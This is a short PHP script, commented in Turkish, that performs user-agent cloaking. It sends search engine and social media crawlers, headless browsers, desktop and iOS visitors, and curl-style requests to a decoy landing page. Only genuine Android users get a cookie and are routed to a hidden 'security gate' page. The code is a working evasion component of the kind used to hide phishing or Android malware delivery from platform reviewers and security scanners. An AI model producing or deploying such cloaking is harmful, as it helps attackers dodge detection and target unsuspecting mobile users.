<?php
// GoDaddy / Apache için Sunucu Taraflı Yönlendirme (Cloaking)
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$uaLower = strtolower($ua);

// Accept header kontrolü
$accept = isset($_SERVER['HTTP_ACCEPT']) ? $_SERVER['HTTP_ACCEPT'] : '';
$isCurlOrEmpty = ($accept === '*/*' || empty($accept) || empty($ua));

// Bot & Crawler tespiti (Facebook, Googlebot, scraper'lar vb.)
$botPattern = '/bot|crawl|spider|headless|phantom|selenium|webdriver|puppeteer|playwright|facebookexternalhit|facebot|googlebot|bingbot|yandex|baidu|duckduck|applebot|twitterbot|slurp|ahrefsbot|semrushbot/i';
$isBot = preg_match($botPattern, $ua);

// Cihaz kontrolleri
$isAndroid = (strpos($uaLower, 'android') !== false);
$isWindows = (strpos($uaLower, 'windows') !== false);
$isMac     = (strpos($uaLower, 'macintosh') !== false);
$isIOS     = (strpos($uaLower, 'iphone') !== false || strpos($uaLower, 'ipad') !== false);
$isLinuxDesktop = (strpos($uaLower, 'x11') !== false || (strpos($uaLower, 'linux') !== false && !$isAndroid));

// Masaüstü, bot, iPhone veya curl/boş istekler -> Doğrudan paravan sayfaya
if ($isBot || $isWindows || $isMac || $isIOS || $isLinuxDesktop || !$isAndroid || $isCurlOrEmpty) {
    header('Location: /landing.html', true, 302);
    exit;
}

// Gerçek Android kullanıcıları -> Güvenlik kapısına (gate.html)
setcookie('_src', '1', time() + 604800, '/', '', false, true);
header('Location: /gate.html', true, 302);
exit;
